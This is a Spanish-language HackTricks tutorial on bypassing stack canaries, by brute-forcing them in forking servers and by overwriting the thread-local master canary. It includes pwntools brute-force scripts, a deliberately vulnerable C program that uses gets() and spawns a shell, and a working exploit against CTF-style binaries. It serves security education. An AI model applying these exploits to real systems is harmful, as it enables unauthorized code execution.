# BF Forked & Threaded Stack Canaries

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCI칍N**](https://github.com/sponsors/carlospolop)!
* Obt칠n la [**oficial mercanc칤a de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci칩n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤guenos** en **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>

**Si te enfrentas a un binario protegido por un canary y PIE (Ejecutable Independiente de la Posici칩n), probablemente necesites encontrar una forma de evadirlos.**

![](<../../../../.gitbook/assets/image (144).png>)

{% hint style="info" %}
Ten en cuenta que **`checksec`** podr칤a no detectar que un binario est치 protegido por un canary si fue compilado est치ticamente y no es capaz de identificar la funci칩n.\
Sin embargo, puedes darte cuenta manualmente si encuentras que se guarda un valor en la pila al comienzo de una llamada a funci칩n y este valor se verifica antes de salir.
{% endhint %}

## Fuerza bruta en el Canary

La mejor manera de evadir un canary simple es si el binario es un programa que **crea procesos hijos cada vez que se establece una nueva conexi칩n** con 칠l (servicio de red), porque cada vez que te conectas a 칠l **se usar치 el mismo canary**.

Entonces, la mejor manera de evadir el canary es simplemente **hacer fuerza bruta car치cter por car치cter**, y puedes averiguar si el byte del canary adivinado fue correcto verificando si el programa ha fallado o contin칰a su flujo regular. En este ejemplo, la funci칩n **hace fuerza bruta en un canary de 8 Bytes (x64)** y distingue entre un byte adivinado correcto y un byte incorrecto simplemente **verificando** si se env칤a una **respuesta** por parte del servidor (otra forma en **otra situaci칩n** podr칤a ser usando un **try/except**):

### Ejemplo 1

Este ejemplo est치 implementado para 64 bits pero podr칤a ser f치cilmente implementado para 32 bits.
```python
from pwn import *

def connect():
r = remote("localhost", 8788)

def get_bf(base):
canary = ""
guess = 0x0
base += canary

while len(canary) < 8:
while guess != 0xff:
r = connect()

r.recvuntil("Username: ")
r.send(base + chr(guess))

if "SOME OUTPUT" in r.clean():
print "Guessed correct byte:", format(guess, '02x')
canary += chr(guess)
base += chr(guess)
guess = 0x0
r.close()
break
else:
guess += 1
r.close()

print "FOUND:\\x" + '\\x'.join("{:02x}".format(ord(c)) for c in canary)
return base

canary_offset = 1176
base = "A" * canary_offset
print("Brute-Forcing canary")
base_canary = get_bf(base) #Get yunk data + canary
CANARY = u64(base_can[len(base_canary)-8:]) #Get the canary
```
### Ejemplo 2

Esto est치 implementado para 32 bits, pero podr칤a cambiarse f치cilmente a 64 bits.\
Tambi칠n tenga en cuenta que para este ejemplo, **el programa espera primero un byte para indicar el tama침o de la entrada** y luego el payload.
```python
from pwn import *

# Here is the function to brute force the canary
def breakCanary():
known_canary = b""
test_canary = 0x0
len_bytes_to_read = 0x21

for j in range(0, 4):
# Iterate up to 0xff times to brute force all posible values for byte
for test_canary in range(0xff):
print(f"\rTrying canary: {known_canary} {test_canary.to_bytes(1, 'little')}", end="")

# Send the current input size
target.send(len_bytes_to_read.to_bytes(1, "little"))

# Send this iterations canary
target.send(b"0"*0x20 + known_canary + test_canary.to_bytes(1, "little"))

# Scan in the output, determine if we have a correct value
output = target.recvuntil(b"exit.")
if b"YUM" in output:
# If we have a correct value, record the canary value, reset the canary value, and move on
print(" - next byte is: " + hex(test_canary))
known_canary = known_canary + test_canary.to_bytes(1, "little")
len_bytes_to_read += 1
break

# Return the canary
return known_canary

# Start the target process
target = process('./feedme')
#gdb.attach(target)

# Brute force the canary
canary = breakCanary()
log.info(f"The canary is: {canary}")
```
## Hilos

Los hilos del mismo proceso tambi칠n **compartir치n el mismo token canary**, por lo tanto ser치 posible **hacer fuerza bruta** a un canary si el binario genera un nuevo hilo cada vez que ocurre un ataque.&#x20;

Un desbordamiento de b칰fer en una funci칩n enhebrada protegida con canary puede ser utilizado para modificar el canary maestro del proceso. Como resultado, la mitigaci칩n es in칰til porque la verificaci칩n se realiza con dos canaries que son iguales (aunque modificados).

### Ejemplo

El siguiente programa es vulnerable a Desbordamiento de B칰fer, pero est치 compilado con canary:
```c
#include <pthread.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>

// gcc thread_canary.c -no-pie -l pthread -o thread_canary

void win() {
execve("/bin/sh", NULL, NULL);
}

void* vuln() {
char data[0x20];
gets(data);
}

int main() {
pthread_t thread;

pthread_create(&thread, NULL, vuln, NULL);
pthread_join(thread, NULL);

return 0;
}
```
Ten en cuenta que `vuln` se llama dentro de un hilo. En GDB podemos echar un vistazo a `vuln`, espec칤ficamente, en el punto donde el programa llama a `gets` para leer datos de entrada:
```bash
gef> break gets
Breakpoint 1 at 0x4010a0
gef> run
...
gef> x/10gx $rdi
0x7ffff7d7ee20: 0x0000000000000000      0x0000000000000000
0x7ffff7d7ee30: 0x0000000000000000      0x0000000000000000
0x7ffff7d7ee40: 0x0000000000000000      0x493fdc653a156800
0x7ffff7d7ee50: 0x0000000000000000      0x00007ffff7e17ac3
0x7ffff7d7ee60: 0x0000000000000000      0x00007ffff7d7f640
```
El anterior representa la direcci칩n de `data`, donde el programa escribir치 la entrada del usuario. El canario de la pila se encuentra en `0x7ffff7d7ee48` (`0x493fdc653a156800`), y la direcci칩n de retorno est치 en `0x7ffff7d7ee50` (`0x00007ffff7e17ac3`):
```bash
gef> telescope $rdi 8 -n
0x7ffff7d7ee20|+0x0000|+000: 0x0000000000000000  <-  $rdi
0x7ffff7d7ee28|+0x0008|+001: 0x0000000000000000
0x7ffff7d7ee30|+0x0010|+002: 0x0000000000000000
0x7ffff7d7ee38|+0x0018|+003: 0x0000000000000000
0x7ffff7d7ee40|+0x0020|+004: 0x0000000000000000
0x7ffff7d7ee48|+0x0028|+005: 0x493fdc653a156800  <-  canary
0x7ffff7d7ee50|+0x0030|+006: 0x0000000000000000  <-  $rbp
0x7ffff7d7ee58|+0x0038|+007: 0x00007ffff7e17ac3 <start_thread+0x2f3>  ->  0xe8ff31fffffe6fe9  <-  retaddr[2]
```
Ten en cuenta que las direcciones de la pila no pertenecen a la pila real:
```bash
gef> vmmap stack
[ Legend:  Code | Heap | Stack | Writable | ReadOnly | None | RWX ]
Start              End                Size               Offset             Perm Path
0x00007ffff7580000 0x00007ffff7d83000 0x0000000000803000 0x0000000000000000 rw- <tls-th1><stack-th2>  <-  $rbx, $rsp, $rbp, $rsi, $rdi, $r12
0x00007ffffffde000 0x00007ffffffff000 0x0000000000021000 0x0000000000000000 rw- [stack]  <-  $r9, $r15
```
El stack del hilo se coloca encima del Almacenamiento Local del Hilo (TLS), donde se almacena el canario maestro:
```bash
gef> tls
$tls = 0x7ffff7d7f640
...
---------------------------------------------------------------------------- TLS ----------------------------------------------------------------------------
0x7ffff7d7f640|+0x0000|+000: 0x00007ffff7d7f640  ->  [loop detected]  <-  $rbx, $r12
0x7ffff7d7f648|+0x0008|+001: 0x00000000004052b0  ->  0x0000000000000001
0x7ffff7d7f650|+0x0010|+002: 0x00007ffff7d7f640  ->  [loop detected]
0x7ffff7d7f658|+0x0018|+003: 0x0000000000000001
0x7ffff7d7f660|+0x0020|+004: 0x0000000000000000
0x7ffff7d7f668|+0x0028|+005: 0x493fdc653a156800  <-  canary
0x7ffff7d7f670|+0x0030|+006: 0xb79b79966e9916c4  <-  PTR_MANGLE cookie
0x7ffff7d7f678|+0x0038|+007: 0x0000000000000000
...
```
{% hint style="info" %}
Algunas de las funciones de GDB mencionadas anteriormente est치n definidas en una extensi칩n llamada [bata24/gef](https://github.com/bata24/gef), la cual tiene m치s caracter칤sticas que la habitual [hugsy/gef](https://github.com/hugsy/gef).
{% endhint %}

Como resultado, un gran desbordamiento de b칰fer puede permitir modificar tanto el canario de la pila como el canario principal en el TLS. Este es el desplazamiento:
```bash
gef> p/x 0x7ffff7d7f668 - $rdi
$1 = 0x848
```
Este es un exploit corto para llamar a `win`:
```python
from pwn import *

context.binary = 'thread_canary'

payload  = b'A' * 0x28                    # buffer overflow offset
payload += b'BBBBBBBB'                    # overwritting stack canary
payload += b'A' * 8                       # saved $rbp
payload += p64(context.binary.sym.win)    # return address
payload += b'A' * (0x848 - len(payload))  # padding
payload += b'BBBBBBBB'                    # overwritting master canary

io = context.binary.process()
io.sendline(payload)
io.interactive()
```
## Otros ejemplos y referencias

* [https://guyinatuxedo.github.io/07-bof\_static/dcquals16\_feedme/index.html](https://guyinatuxedo.github.io/07-bof\_static/dcquals16\_feedme/index.html)
* 64 bits, sin PIE, nx, BF canary, escribir en alguna memoria un ROP para llamar a `execve` y saltar all칤.
* [http://7rocky.github.io/en/ctf/htb-challenges/pwn/robot-factory/#canaries-and-threads](http://7rocky.github.io/en/ctf/htb-challenges/pwn/robot-factory/#canaries-and-threads)
* 64 bits, sin PIE, nx, modificar el canary del hilo y el maestro.
